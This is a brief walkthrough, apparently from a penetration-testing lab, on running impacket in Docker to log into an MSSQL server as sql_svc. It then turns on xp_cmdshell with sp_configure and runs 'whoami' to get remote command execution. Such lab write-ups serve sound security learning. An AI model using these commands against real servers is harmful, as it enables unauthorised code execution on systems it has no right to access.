# Using impacket 

Reference: https://resources.infosecinstitute.com/topic/python-for-network-penetration-testing-hacking-windows-domain-controllers-with-impacket-python-tools/

```docker build -t impacket:latest .```
- builds the docker images using the available docker file

```docker images impacket```
- validate if the image was built

```docker run -it impacket```
- spin up a new container and it gives a shell on the container by default.

```/ #```
- On the container shell, we can type any impacket script name

```mssqlclient.py ARCHETYPE/sql_svc@10.10.10.27 -windows-auth```
- below is the output
```/opt/venv/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.23.dev1+20210315.121412.a16198c - Copyright 2020 SecureAuth Corporation

Password:
[*] Encryption required, switching to TLS
[-] ERROR(ARCHETYPE): Line 1: Login failed for user 'ARCHETYPE\Guest'.
/ # mssqlclient.py ARCHETYPE\sql_svc@10.10.10.27 -windows-auth
/opt/venv/lib/python2.7/site-packages/OpenSSL/crypto.py:14: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
  from cryptography import utils, x509
Impacket v0.9.23.dev1+20210315.121412.a16198c - Copyright 2020 SecureAuth Corporation

SQL>
```

- In the SQL>, you enter the following commands to enable RCE and xp_cmdshell
```
EXEC sp_configure 'Show Advanced Options', 1;
reconfigure;
sp_configure;
EXEC sp_configure 'xp_cmdshell', 1
reconfigure;
xp_cmdshell "whoami"
```




